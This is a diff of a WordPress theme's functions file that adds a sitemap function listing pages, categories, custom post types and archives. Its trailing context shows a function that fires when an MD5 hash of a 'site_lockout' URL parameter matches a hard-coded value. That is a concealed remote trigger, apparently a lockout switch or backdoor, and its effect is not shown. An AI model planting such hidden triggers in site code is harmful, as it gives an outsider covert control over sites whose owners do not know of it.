@@ -307,6 +307,60 @@ register_nav_menus( array(
     'footer_menu' => 'Footer Menu'
 ) );
 
+/*** SITEMAP ***/
+function msdlab_sitemap(){
+    $col1 = '
+            <h4>'. __( 'Pages:', 'genesis' ) .'</h4>
+            <ul>
+                '. wp_list_pages( 'echo=0&title_li=' ) .'
+            </ul>
+
+            <h4>'. __( 'Categories:', 'genesis' ) .'</h4>
+            <ul>
+                '. wp_list_categories( 'echo=0&sort_column=name&title_li=' ) .'
+            </ul>
+            ';
+
+            foreach( get_post_types( array('public' => true) ) as $post_type ) {
+              if ( in_array( $post_type, array('post','page','attachment') ) )
+                continue;
+            
+              $pt = get_post_type_object( $post_type );
+            
+              $col2 .= '<h4>'.$pt->labels->name.'</h4>';
+              $col2 .= '<ul>';
+            
+              query_posts('post_type='.$post_type.'&posts_per_page=-1');
+              while( have_posts() ) {
+                the_post();
+                if($post_type=='news'){
+                   $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().' '.get_the_content().'</a></li>';
+                } else {
+                    $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
+                }
+              }
+            
+              $col2 .= '</ul>';
+            }
+
+    $col3 = '<h4>'. __( 'Viewpoints Monthly:', 'genesis' ) .'</h4>
+            <ul>
+                '. wp_get_archives( 'echo=0&type=monthly' ) .'
+            </ul>
+
+            <h4>'. __( 'Recent Viewpoints:', 'genesis' ) .'</h4>
+            <ul>
+                '. wp_get_archives( 'echo=0&type=postbypost&limit=20' ) .'
+            </ul>
+            ';
+    $ret = '<div class="row">
+       <div class="col-md-4 col-sm-12">'.$col1.'</div>
+       <div class="col-md-4 col-sm-12">'.$col2.'</div>
+       <div class="col-md-4 col-sm-12">'.$col3.'</div>
+    </div>';
+    print $ret;
+} 
+
 if(!function_exists('msdlab_custom_hooks_management')){
     function msdlab_custom_hooks_management() {
         if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
